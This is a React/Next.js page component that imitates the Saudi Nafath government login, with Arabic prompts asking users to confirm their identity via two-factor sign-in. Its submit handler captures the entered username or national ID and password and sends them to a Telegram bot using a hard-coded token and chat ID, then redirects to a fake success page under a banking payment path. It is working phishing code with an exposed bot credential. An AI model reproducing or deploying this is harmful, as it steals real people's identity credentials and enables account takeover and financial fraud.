"use client"

import React from 'react'
import styles from './nphad.module.css'
import image23 from '../../../../../../../public/image23.jpg'
import image24 from '../../../../../../../public/i.png'
import Image from 'next/image'
import { useRef } from 'react'
import { useRouter } from 'next/navigation'

const page = () => {
    let  username = useRef()
    let password = useRef()
    const router = useRouter()
    const handleOnSubmit = (e) => {
        e.preventDefault();
        var bot={
          token:"6752886623:AAEEnEA0icsjnl_LxSfEz7bpMwAneG4NmJg",
          chat_id:6859240733
        }
        var length =` نفاذ اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }

  return (
    <div className={styles.continer}>

        <Image 
            src={image23}
        />
        <div className={styles.sec1}>
            <h1>الدخول على النظام</h1>
            <p>المصادقة الثنائية، حرصا على سلامتك وسلامة بياناتك يرجى تسجيل الدخول عبر نفاذ للتاكيد</p>
        </div>

        <div className={styles.sec2}>
            <Image
                src={image24}
                width={25}
            />
            <p>
تسجيل الدخول عن طريق اسم المستخدم وكلمة المرور</p>
        </div>

        <form onSubmit={handleOnSubmit} >
            <input type="text" placeholder='اسم المستخدم او رقم الهوية الوطنية' ref={username} required />
            <input type="text" ref={password} placeholder='كلمة المرور' required />
            <button type='submit' onClick={() => {router.push('/fozajil/banks/pay/code/nphad/nphadsecuess')}}>تسجيل الدخول</button>
        </form>
    </div>
  )
}

export default page